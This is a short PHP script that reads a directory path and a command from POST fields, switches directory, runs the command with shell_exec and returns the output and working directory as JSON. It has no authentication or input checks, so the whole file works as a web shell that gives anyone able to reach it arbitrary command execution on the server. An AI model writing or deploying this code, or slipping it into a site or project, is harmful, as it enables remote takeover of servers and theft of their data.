<?php
    $path = $_POST['path'];
    $cmd = $_POST['cmd'];
    $output = null;

    if(substr($cmd, 0, 2) == 'cd'){
        chdir($path . '/' . substr($cmd, 3));
    } else{
        chdir($path);
        $output = shell_exec($cmd);
    }

    $array = array(
        'cmdResult' => json_encode($output),
        'path' => getcwd());
    echo json_encode($array);
?>